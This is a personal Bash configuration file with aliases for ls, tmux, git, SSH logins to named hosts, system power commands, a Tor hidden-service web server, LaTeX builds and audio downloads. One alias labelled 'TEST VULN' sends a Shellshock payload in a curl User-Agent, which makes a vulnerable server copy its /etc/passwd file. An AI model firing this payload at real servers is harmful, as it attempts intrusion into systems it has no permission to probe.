# ~/.bashrc
#

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

alias ls='ls --color=auto'
alias ll='ls -lF --color=auto'
alias la='ls -a'
alias vimtest='vim -u ~/.vimrctest'
alias gvim='gvim -geometry 55x39'
alias pingg='ping -c 3 www.google.com'
alias httppingg='curl -I http://google.com/ > /dev/null 2>&1 && echo success || echo failure'
alias lock-screen='xscreensaver-command -lock'
alias i3lock='i3lock -c 000000 -n'
alias xtime='date +%T'
alias connect_unict='ssh -v ubuntu@151.97.12.231'
alias mountt='sudo mount -t ntfs-3g $1 $2'
alias ntpsync='sudo ntpd -qg'
alias reboot='sudo systemctl reboot'
alias suspend='sudo systemctl suspend'
alias poweroff='sudo systemctl poweroff'
alias myip='curl ifconfig.me'
alias netctl-current='netctl list | grep "*"'
alias py2=python2.7
alias py3=python3
alias eclipse='eclipse -vmargs -Xmx1024M'
alias tmux='tmux -2'
alias tma='tmux attach -d -t'
alias git-tmux='tmux new -s $(basename $(pwd))'
alias nopaste="curl -F 'sprunge=<-' http://sprunge.us"
#TEST VULN
alias vuln="curl -A '() { :; }; /bin/cat /etc/passwd > dumped_file' $1"
alias deneva="ssh x0230192@deneva.cselt.it"
alias deneva2="ssh x0230192@163.162.93.114"

#GIT ALIASES
alias gl="git log --oneline --decorate"

#alias hiddensrv-start="sudo /usr/bin/thttpd -c /etc/thttpd.conf -d /srv/http/hiddensrv/"
#alias hiddensrv-stop="sudo kill -9 '$(pgrep thttpd)'"
PS1='\[\e[0;32m\]\u\[\e[m\] \[\e[1;34m\]\w\[\e[m\] \[\e[1;32m\]\$\[\e[m\] \[\e[0;37m\]'
export EDITOR="vim"
[[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm"
export PATH="$PATH:$HOME/.rvm/bin" # Add RVM to PATH for scripting
export MUSIC_DIR='~/Dropbox/#Music/'
export VISUAL="vim"
#export TERM=xterm-256color

[[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm"


# ** TOR HIDDEN SERVICE **

alias hiddensrv-start="sudo /usr/bin/thttpd -c /etc/thttpd.conf -d /var/lib/tor/hiddensrv/"
#alias hiddensrv-stop="sudo kill -9 '$(pgrep thttpd)'"
function hiddensrv-stop(){
	pid=$(pgrep thttpd)
	if [ "$pid" == ""  ]; then
		echo "[thttpd] Service not running"
	else
		echo "[thttpd] Stop: $pid"
		sudo kill -9 $pid
	fi

}


#LATEX ALIASes
function texbuild(){
	filename=$(basename "$1")
	extension="${filename##*.}"
	filename="${filename%.*}"
	if [ -f "$1" ]; then
		latex $filename
		latex $filename
		echo "Making dvi.."
		dvips $filename.dvi #-o $filename.ps
		echo "Making ps.."
		ps2pdf $filename.ps
		echo "Making pdf"
		rm *.log *.ps *.dvi *.out *.aux
		#evince $filename.pdf
	fi
}

function ytdownload(){
	if [[ -z "$1" ]]; then
		echo "Usage:  ytdownload <URL>"
	else
		echo "[Retrieving media]"
		youtube-dl -x --audio-format mp3 $1 -o  $MUSIC_DIR'%(title)s.%(ext)s'
		#echo "Updating mpc"
		#mpc update
	fi
}

setup_tmux_layout() {
	# Create a new window.
	tmux new-window -a -n '$1'
        # Now split it twice, first horizontally and then  vertically.
        tmux split-window -h
        tmux split-window -v
}
